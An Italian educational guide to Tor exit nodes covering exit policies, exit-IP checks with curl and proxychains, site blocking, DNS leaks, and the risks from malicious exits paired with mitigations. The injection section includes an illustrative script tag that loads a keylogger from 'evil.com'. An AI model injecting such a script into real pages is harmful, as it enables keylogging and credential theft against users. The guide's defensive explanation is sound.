# Exit Nodes — L'Ultimo Hop e il Punto di Massimo Rischio

Questo documento analizza in profondità gli Exit Node della rete Tor: il loro ruolo
nel circuito, le exit policy, i rischi di sicurezza (sniffing, injection, MITM),
come verificare l'IP di uscita, e le implicazioni per chi opera un exit.

Include osservazioni dalla mia esperienza nel verificare exit IP, nel gestire
blocchi e CAPTCHA, e nel comprendere perché certi siti non funzionano via Tor.

---
---

## Indice

- [Ruolo dell'Exit Node](#ruolo-dellexit-node)
- [Exit Policy — Le regole di uscita](#exit-policy-le-regole-di-uscita)
- [Rischi specifici degli Exit Node](#rischi-specifici-degli-exit-node)
- [Verificare l'IP dell'Exit Node](#verificare-lip-dellexit-node)
- [Blocchi e CAPTCHA — Come i siti reagiscono agli Exit Node](#blocchi-e-captcha-come-i-siti-reagiscono-agli-exit-node)
- [Exit Node e DNS — Chi risolve cosa](#exit-node-e-dns-chi-risolve-cosa)
- [Exit Policy e il principio di selettività](#exit-policy-e-il-principio-di-selettività)
- [Identificare gli Exit Node nel consenso](#identificare-gli-exit-node-nel-consenso)
- [Riepilogo dei rischi e mitigazioni](#riepilogo-dei-rischi-e-mitigazioni)


## Ruolo dell'Exit Node

L'Exit Node è l'**ultimo nodo** del circuito Tor:

```
[Tu] ──► [Guard] ──► [Middle] ──► [Exit Node] ──TCP──► [Internet]
```

L'Exit è il punto dove il traffico **esce dalla rete Tor** e raggiunge la
destinazione finale come traffico TCP normale.

### Cosa conosce l'Exit Node

| Informazione | Visibile all'Exit? |
|-------------|-------------------|
| Il tuo IP reale | **NO** — vede solo l'IP del Middle |
| La destinazione (hostname + porta) | **SI** — è lui che apre la connessione |
| Il contenuto HTTP in chiaro | **SI** — se il sito non usa HTTPS |
| Il contenuto HTTPS | **NO** — vede solo il traffico TLS cifrato |
| I metadati TLS (SNI) | **SI** — il Server Name Indication è in chiaro nel ClientHello |
| Le query DNS | **SI** — è lui che risolve gli hostname |
| Il timing delle richieste | **SI** — vede quando ogni stream inizia e finisce |

### Il punto critico: l'Exit vede il traffico in chiaro

Questa è la conseguenza più importante dell'architettura Tor:

```
Con HTTPS:
Exit → vede → [TLS encrypted blob] → destinazione
              (non può leggere il contenuto)

Senza HTTPS:
Exit → vede → [GET /login?user=mario&pass=123] → destinazione
              (LEGGE TUTTO IN CHIARO)
```

---

## Exit Policy — Le regole di uscita

### Cos'è l'Exit Policy

Ogni Exit Node definisce una **exit policy**: un insieme di regole che specificano
verso quali indirizzi e porte il relay è disposto a inoltrare traffico.

Le policy sono valutate in ordine, first-match-wins:

```
accept *:80       # Accetta traffico verso porta 80 (HTTP) ovunque
accept *:443      # Accetta traffico verso porta 443 (HTTPS) ovunque
reject *:*        # Rifiuta tutto il resto
```

### Policy tipiche

**Exit minima (solo web)**:
```
accept *:80
accept *:443
reject *:*
```

**Exit permissiva (default ridotto)**:
```
accept *:20-23     # FTP, SSH, Telnet
accept *:43        # WHOIS
accept *:53        # DNS
accept *:79-81     # Finger, HTTP
accept *:88        # Kerberos
accept *:110       # POP3
accept *:143       # IMAP
accept *:443       # HTTPS
accept *:993       # IMAPS
accept *:995       # POP3S
reject *:*
```

**Exit restrittiva (no exit)**:
```
reject *:*
```
Questo relay non è un exit — è solo un middle/guard.

### Policy nel consenso

Il consenso contiene una versione compressa dell'exit policy per ogni relay:

```
p accept 80,443
p accept 20-23,43,53,79-81,110,143,443,993,995
p reject 1-65535
```

Tor usa queste policy per selezionare l'exit corretto per la destinazione richiesta.
Se vuoi raggiungere la porta 22 (SSH), Tor seleziona solo exit che accettano la porta 22.

### Nella mia esperienza

Quando uso `proxychains curl https://api.ipify.org`, Tor deve selezionare un exit
con policy che accetta la porta 443. Questo non è mai un problema perché la
maggior parte degli exit accetta 443.

Ma quando ho provato `proxychains ssh user@server.com`, la connessione falliva
spesso perché molti exit non accettano la porta 22. In quei casi, Tor costruisce
circuiti e li scarta finché non trova un exit adatto — causando ritardi significativi.

---

## Rischi specifici degli Exit Node

### 1. Sniffing del traffico non cifrato

Un exit malevolo esegue un'analisi passiva del traffico che transita:

```
Traffico HTTP (non cifrato):
- URL completi (es. http://example.com/api/login)
- Headers HTTP (Cookie, Authorization, User-Agent)
- Body delle richieste POST (username, password, dati form)
- Contenuto delle risposte (pagine HTML, JSON, file)

Traffico HTTPS (cifrato TLS):
- SNI (Server Name Indication) — il dominio in chiaro nel ClientHello
  (es. "api.ipify.org" è visibile anche con HTTPS)
- Dimensione approssimativa delle risposte
- Timing delle richieste
```

**L'exit malevolo può**:
- Raccogliere credenziali HTTP in chiaro
- Profilare il traffico basandosi su SNI e dimensioni
- Raccogliere metadata (chi visita cosa, quando)

**Non può**:
- Decifrare traffico HTTPS (non ha la chiave privata del server)
- Risalire al tuo IP (vede solo il Middle)

### 2. Manipolazione attiva del traffico

Un exit malevolo può modificare il traffico non cifrato:

**HTTP injection**: inserire JavaScript malevolo nelle pagine HTTP:
```html
<!-- Pagina originale del sito -->
<html>...</html>

<!-- L'exit inietta alla fine: -->
<script src="http://evil.com/keylogger.js"></script>
```

**Download injection**: modificare file scaricati via HTTP:
```
Utente scarica: http://example.com/software.exe
Exit sostituisce con: malware.exe (stesse dimensioni, nome uguale)
```

**SSL stripping**: redirigere da HTTPS a HTTP per poi leggere in chiaro:
```
1. Utente chiede: http://example.com (senza S)
2. Il server risponde: 301 Redirect → https://example.com
3. L'exit intercetta il redirect e lo rimuove
4. L'utente continua a usare HTTP in chiaro
5. L'exit legge tutto
```

**Mitigazione**: HSTS (HTTP Strict Transport Security) previene SSL stripping se il
browser ha già visitato il sito in HTTPS. Tor Browser ha una lista HSTS precaricata.

### 3. Attacchi al DNS

L'exit node risolve gli hostname per conto dell'utente. Un exit malevolo può:

- **DNS spoofing**: risolvere `login.bank.com` verso un server di phishing
- **DNS logging**: registrare tutti i domini richiesti dall'utente
- **Selective blocking**: non risolvere certi domini per forzare l'utente
  verso alternative controllate

**Mitigazione**: HTTPS con validazione del certificato. Se `login.bank.com` viene
risolto verso un IP malevolo, il certificato TLS non corrisponderà e il browser
mostrerà un errore.

### 4. Exit node come "Man in the Middle" su TLS

Un exit malevolo potrebbe tentare un attacco MITM su HTTPS:

```
1. L'utente chiede HTTPS verso example.com
2. L'exit si connette a example.com e ottiene il certificato legittimo
3. L'exit genera un certificato falso per example.com
4. L'exit lo presenta all'utente

Ma: il certificato falso non è firmato da una CA trusted
→ Il browser mostra un errore di certificato
→ L'attacco fallisce se l'utente non ignora l'errore
```

**Protezione**: non ignorare mai errori di certificato quando si è su Tor. Tor
Browser mostra avvisi prominenti in questi casi.

---

## Verificare l'IP dell'Exit Node

### Metodo 1: curl via SOCKS5

```bash
> curl --socks5-hostname 127.0.0.1:9050 https://api.ipify.org
185.220.101.143
```

Questo mostra l'IP dell'Exit Node corrente. L'IP è quello che i siti web vedono.

### Metodo 2: proxychains curl

```bash
> proxychains curl https://api.ipify.org
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  api.ipify.org:443  ...  OK
185.220.101.143
```

### Metodo 3: Informazioni dettagliate

```bash
> proxychains curl -s https://ipinfo.io
{
  "ip": "185.220.101.143",
  "city": "Amsterdam",
  "region": "North Holland",
  "country": "NL",
  "org": "AS60729 Stichting Tor Exit",
  "timezone": "Europe/Amsterdam"
}
```

L'organizzazione (`org`) spesso contiene "Tor Exit" nel nome, perché molti exit sono
gestiti da organizzazioni dedicate.

### Metodo 4: Verificare se l'IP è un exit Tor noto

```bash
> proxychains curl -s https://check.torproject.org/api/ip
{"IsTor":true,"IP":"185.220.101.143"}
```

`IsTor: true` conferma che l'IP è un exit node Tor noto.

### Nella mia esperienza

Dopo ogni NEWNYM, verifico che l'IP sia cambiato:

```bash
> proxychains curl -s https://api.ipify.org
185.220.101.143

> ~/scripts/newnym
250 OK
250 closing connection

> proxychains curl -s https://api.ipify.org
104.244.76.13         # IP diverso → nuovo circuito, nuovo exit

> proxychains curl -s https://ipinfo.io | grep org
"org": "AS53667 FranTech Solutions"
```

Non tutti gli exit hanno "Tor" nel nome dell'organizzazione. Alcuni sono VPS normali
il cui operatore ha deciso di far girare un exit node.

---

## Blocchi e CAPTCHA — Come i siti reagiscono agli Exit Node

### Perché i siti bloccano Tor

Gli IP degli exit node Tor sono **pubblicamente noti** (sono nel consenso). I siti
possono:

1. **Scaricare la lista degli exit** da `https://check.torproject.org/torbulkexitlist`
2. **Bloccare o limitare** le connessioni provenienti da questi IP
3. **Richiedere CAPTCHA** aggiuntivi
4. **Ridurre le funzionalità** (no login, no acquisti, no API)

### Siti che ho testato personalmente

| Sito | Comportamento via Tor |
|------|----------------------|
| Google Search | CAPTCHA frequenti, a volte blocco totale |
| Google Maps | Funziona con CAPTCHA occasionali |
| Amazon | Blocco login, richiesta verifica aggiuntiva |
| Reddit | Funziona ma richiede login frequente |
| GitHub | Funziona generalmente bene |
| Wikipedia | Lettura OK, editing bloccato |
| PayPal | Login bloccato, "suspicious activity" |
| Instagram/Meta | Login molto difficile, blocchi frequenti |
| Stack Overflow | Funziona bene |
| Banche italiane | Blocco totale o 2FA forzato |

### Strategie per gestire i blocchi

1. **NEWNYM e riprova**: a volte il blocco è sull'exit specifico. Cambiando exit
   (NEWNYM) potresti ottenere un exit non bloccato.

2. **Non loggarsi**: usare Tor per navigazione anonima, non per account personali.
   Loggarsi con account personali su Tor è un errore OPSEC (vedi sezione sicurezza).

3. **Accettare i limiti**: certi servizi non funzioneranno mai bene via Tor. È
   un compromesso dell'anonimato.

---

## Exit Node e DNS — Chi risolve cosa

### Il flusso DNS in un circuito Tor

```
1. L'utente chiede di connettersi a "example.com"
2. L'hostname viene inviato al SocksPort come DOMAINNAME (non risolto localmente)
3. Tor crea una cella RELAY_BEGIN con "example.com:443"
4. L'Exit Node riceve "example.com:443"
5. L'Exit Node usa il SUO resolver DNS per risolvere "example.com"
6. L'Exit Node si connette all'IP risultante
```

### Implicazioni

- **Il DNS non esce MAI dal tuo computer** (se usi proxychains/torsocks correttamente)
- **L'Exit Node fa la risoluzione DNS** → usa il DNS del datacenter dove si trova
- **Exit diversi possono risolvere hostname diversamente** (CDN, load balancing, geo-DNS)

### DNS leak

Se un'applicazione risolve l'hostname PRIMA di inviarlo al SocksPort, il DNS
esce in chiaro verso il tuo ISP. Questo è un **DNS leak**:

```
CORRETTO (no leak):
curl --socks5-hostname 127.0.0.1:9050 https://example.com
  → "example.com" inviato come stringa a Tor → Exit risolve

SBAGLIATO (leak):
curl --socks5 127.0.0.1:9050 https://example.com
  → curl risolve "example.com" localmente → DNS leak!
  → poi invia l'IP a Tor

La differenza è --socks5-hostname (risolve via proxy) vs --socks5 (risolve localmente)
```

Proxychains con `proxy_dns` attivo gestisce questo automaticamente, intercettando
le chiamate DNS e inviandole al proxy.

---

## Exit Policy e il principio di selettività

### Perché non tutti gli exit permettono tutte le porte

Operare un exit node espone l'operatore a rischi legali:
- Il traffico che esce dal suo IP può contenere attività illegali
- Le forze dell'ordine possono risalire all'IP dell'exit (è pubblico)
- L'operatore potrebbe ricevere notifiche DMCA, richieste legali, etc.

Per questo, molti operatori limitano la exit policy a porte "sicure" (80, 443)
ed escludono porte associate ad abusi (25 per spam, 6667 per IRC abuse, etc.).

### Exit policy e selezione del circuito

Tor seleziona l'exit PRIMA di costruire il circuito. Il processo è:

1. L'applicazione chiede di connettersi a `example.com:443`
2. Tor cerca nel consenso un exit con policy `accept *:443`
3. Seleziona un exit (pesato per bandwidth) dal pool dei candidati
4. Costruisce il circuito: guard → middle → exit selezionato
5. Invia RELAY_BEGIN con la destinazione

Se nessun exit supporta la porta richiesta, Tor restituisce un errore al client SOCKS.

### Nella mia esperienza

Per le porte standard (80, 443) non ho mai avuto problemi di exit policy. Per SSH
(porta 22), occasionalmente Tor impiega più tempo a trovare un exit adatto, e a
volte fallisce:

```bash
> proxychains ssh user@myserver.com
[proxychains] Dynamic chain ... timeout
```

In quei casi, riprovo dopo NEWNYM (che forza nuovi circuiti con exit potenzialmente
diversi).

---

## Identificare gli Exit Node nel consenso

### Consultare la lista degli exit

```bash
# Scaricare la lista degli exit via Tor
proxychains curl -s https://check.torproject.org/torbulkexitlist > /tmp/exit-list.txt
wc -l /tmp/exit-list.txt
# Output: ~1200 (numero approssimativo di exit attivi)

# Verificare se un IP è un exit
grep "185.220.101.143" /tmp/exit-list.txt
# Se presente → è un exit Tor noto
```

### Statistiche sugli exit

La rete Tor ha circa:
- ~7000 relay totali
- ~1000-1500 relay con flag Exit
- ~800-1000 exit che accettano la porta 443
- ~400-600 exit che accettano anche la porta 22

Il numero relativamente basso di exit rispetto ai relay totali è il motivo per cui:
- Gli exit sono il collo di bottiglia della rete
- I bandwidth weights nel consenso favoriscono gli exit
- I siti possono facilmente elencare e bloccare tutti gli exit

---

## Riepilogo dei rischi e mitigazioni

| Rischio | Condizione | Mitigazione |
|---------|-----------|-------------|
| Sniffing contenuto | Solo se HTTP (non HTTPS) | Usare SEMPRE HTTPS |
| DNS spoofing | Exit malevolo | Verificare certificati TLS |
| SSL stripping | Sito raggiunto via HTTP iniziale | HSTS, Tor Browser |
| Download injection | File scaricato via HTTP | Verificare hash/firma |
| Logging metadata | Sempre possibile | Tor Browser riduce metadata |
| MITM su TLS | Exit genera cert falso | Non ignorare errori certificato |
| Blocchi/CAPTCHA | IP exit è pubblico | NEWNYM, accettare il compromesso |
| Exit policy restrittiva | Porte non standard | Riprova con NEWNYM |

---

## Vedi anche

- [Guard Nodes](guard-nodes.md) — Primo hop del circuito
- [Middle Relay](middle-relay.md) — Secondo hop del circuito
- [Aspetti Legali](../08-aspetti-legali-ed-etici/aspetti-legali.md) — Legalità dell'operare un exit node
- [Etica e Responsabilità](../08-aspetti-legali-ed-etici/etica-e-responsabilita.md) — Responsabilità dell'operatore
- [Limitazioni nelle Applicazioni](../07-limitazioni-e-attacchi/limitazioni-applicazioni.md) — Siti che bloccano exit Tor
